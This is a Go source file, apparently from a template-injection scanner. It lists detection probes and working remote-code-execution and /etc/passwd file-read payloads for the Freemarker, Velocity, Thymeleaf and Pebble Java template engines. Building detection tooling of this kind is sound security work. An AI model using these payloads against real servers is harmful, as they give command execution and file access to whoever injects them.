package ssti

// Freemarker payloads (Java).
// Source: PayloadsAllTheThings, HackTricks
var freemarkerPayloads = []Payload{
	// Detection payloads
	{
		Value:           "${7*7}",
		Engine:          EngineFreemarker,
		Type:            TypeDetection,
		Description:     "Basic Freemarker math expression",
		DetectionMethod: MethodMath,
		ExpectedOutput:  "49",
	},
	{
		Value:           "#{7*7}",
		Engine:          EngineFreemarker,
		Type:            TypeDetection,
		Description:     "Freemarker numeric expression",
		DetectionMethod: MethodMath,
		ExpectedOutput:  "49",
	},
	{
		Value:           "${7+7}",
		Engine:          EngineFreemarker,
		Type:            TypeDetection,
		Description:     "Freemarker addition",
		DetectionMethod: MethodMath,
		ExpectedOutput:  "14",
	},
	// Class access
	{
		Value:           "${.class}",
		Engine:          EngineFreemarker,
		Type:            TypeFingerprint,
		Description:     "Freemarker class introspection",
		DetectionMethod: MethodReflection,
		ExpectedOutput:  "class",
	},
	{
		Value:           "${.version}",
		Engine:          EngineFreemarker,
		Type:            TypeFingerprint,
		Description:     "Freemarker version disclosure",
		DetectionMethod: MethodReflection,
	},
	// RCE payloads
	{
		Value:           "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
		Engine:          EngineFreemarker,
		Type:            TypeRCE,
		Description:     "Freemarker RCE via Execute class",
		DetectionMethod: MethodOutput,
		ExpectedOutput:  "uid=",
	},
	{
		Value:           "[#assign ex=\"freemarker.template.utility.Execute\"?new()]${ex(\"id\")}",
		Engine:          EngineFreemarker,
		Type:            TypeRCE,
		Description:     "Freemarker RCE alternate syntax",
		DetectionMethod: MethodOutput,
		ExpectedOutput:  "uid=",
	},
	{
		Value:           "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
		Engine:          EngineFreemarker,
		Type:            TypeRCE,
		Description:     "Freemarker inline Execute",
		DetectionMethod: MethodOutput,
		ExpectedOutput:  "uid=",
	},
	// File read
	{
		Value:           "<#assign content = .data_model.getClass().forName(\"java.io.File\").getDeclaredConstructor(.data_model.getClass().forName(\"java.lang.String\")).newInstance(\"/etc/passwd\")>${content.exists()?then(\"exists\",\"\")}",
		Engine:          EngineFreemarker,
		Type:            TypeFileRead,
		Description:     "Freemarker file check",
		DetectionMethod: MethodReflection,
		ExpectedOutput:  "exists",
	},
	// ObjectConstructor RCE
	{
		Value:           "<#assign classloader=object?api.class.protectionDomain.classLoader><#assign owc=classloader.loadClass(\"freemarker.template.ObjectWrapper\")><#assign dwf=owc.getField(\"DEFAULT_WRAPPER\").get(null)><#assign ec=classloader.loadClass(\"freemarker.template.utility.Execute\")>${dwf.newInstance(ec,null)(\"id\")}",
		Engine:          EngineFreemarker,
		Type:            TypeRCE,
		Description:     "Freemarker RCE via ObjectWrapper",
		DetectionMethod: MethodOutput,
		ExpectedOutput:  "uid=",
	},
}

// Velocity payloads (Java).
// Source: PayloadsAllTheThings, HackTricks
var velocityPayloads = []Payload{
	// Detection payloads
	{
		Value:           "#set($x=7*7)$x",
		Engine:          EngineVelocity,
		Type:            TypeDetection,
		Description:     "Basic Velocity math expression",
		DetectionMethod: MethodMath,
		ExpectedOutput:  "49",
	},
	{
		Value:           "$class.inspect('java.lang.Runtime')",
		Engine:          EngineVelocity,
		Type:            TypeFingerprint,
		Description:     "Velocity class inspection",
		DetectionMethod: MethodReflection,
		ExpectedOutput:  "Runtime",
	},
	// RCE payloads
	{
		Value:           "#set($ex='')#set($rt=$ex.class.forName('java.lang.Runtime'))#set($chr=$ex.class.forName('java.lang.Character'))#set($str=$ex.class.forName('java.lang.String'))#set($ex=$rt.getRuntime())#set($out=$ex.exec('id'))$out.waitFor()#set($reader=$ex.class.forName('java.io.InputStreamReader').getConstructor($ex.class.forName('java.io.InputStream')).newInstance($out.getInputStream()))#set($scanner=$ex.class.forName('java.util.Scanner').getConstructor($ex.class.forName('java.io.InputStream')).newInstance($out.getInputStream()))$scanner.useDelimiter('\\\\A').next()",
		Engine:          EngineVelocity,
		Type:            TypeRCE,
		Description:     "Velocity full RCE chain",
		DetectionMethod: MethodOutput,
		ExpectedOutput:  "uid=",
	},
	{
		Value:           "$class.inspect('java.lang.Runtime').type.getRuntime().exec('id')",
		Engine:          EngineVelocity,
		Type:            TypeRCE,
		Description:     "Velocity RCE via inspect",
		DetectionMethod: MethodOutput,
		ExpectedOutput:  "uid=",
	},
}

// Thymeleaf payloads (Java).
// Source: PayloadsAllTheThings, HackTricks
var thymeleafPayloads = []Payload{
	// Detection payloads
	{
		Value:           "${7*7}",
		Engine:          EngineThymeleaf,
		Type:            TypeDetection,
		Description:     "Basic Thymeleaf math expression",
		DetectionMethod: MethodMath,
		ExpectedOutput:  "49",
	},
	{
		Value:           "*{7*7}",
		Engine:          EngineThymeleaf,
		Type:            TypeDetection,
		Description:     "Thymeleaf selection variable",
		DetectionMethod: MethodMath,
		ExpectedOutput:  "49",
	},
	// RCE payloads
	{
		Value:           "${T(java.lang.Runtime).getRuntime().exec('id')}",
		Engine:          EngineThymeleaf,
		Type:            TypeRCE,
		Description:     "Thymeleaf RCE via Runtime",
		DetectionMethod: MethodOutput,
		ExpectedOutput:  "Process",
	},
	{
		Value:           "${#rt = @java.lang.Runtime@getRuntime(),#rt.exec('id')}",
		Engine:          EngineThymeleaf,
		Type:            TypeRCE,
		Description:     "Thymeleaf RCE via OGNL",
		DetectionMethod: MethodOutput,
		ExpectedOutput:  "Process",
	},
	{
		Value:           "__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).next()}__::.x",
		Engine:          EngineThymeleaf,
		Type:            TypeRCE,
		Description:     "Thymeleaf pre-processing RCE",
		DetectionMethod: MethodOutput,
		ExpectedOutput:  "uid=",
	},
	{
		Value:           "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x",
		Engine:          EngineThymeleaf,
		Type:            TypeRCE,
		Description:     "Thymeleaf pre-processing exec",
		DetectionMethod: MethodOutput,
		ExpectedOutput:  "Process",
	},
	// File read
	{
		Value:           "${T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get('/etc/passwd'))}",
		Engine:          EngineThymeleaf,
		Type:            TypeFileRead,
		Description:     "Thymeleaf file read via NIO",
		DetectionMethod: MethodOutput,
		ExpectedOutput:  "root:",
	},
}

// Pebble payloads (Java).
// Source: PayloadsAllTheThings
var pebblePayloads = []Payload{
	// Detection payloads
	{
		Value:           "{{7*7}}",
		Engine:          EnginePebble,
		Type:            TypeDetection,
		Description:     "Basic Pebble math expression",
		DetectionMethod: MethodMath,
		ExpectedOutput:  "49",
	},
	// RCE payloads
	{
		Value:           "{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(([bytes]).toArray()) }}",
		Engine:          EnginePebble,
		Type:            TypeRCE,
		Description:     "Pebble RCE via Runtime",
		DetectionMethod: MethodOutput,
		ExpectedOutput:  "uid=",
	},
}
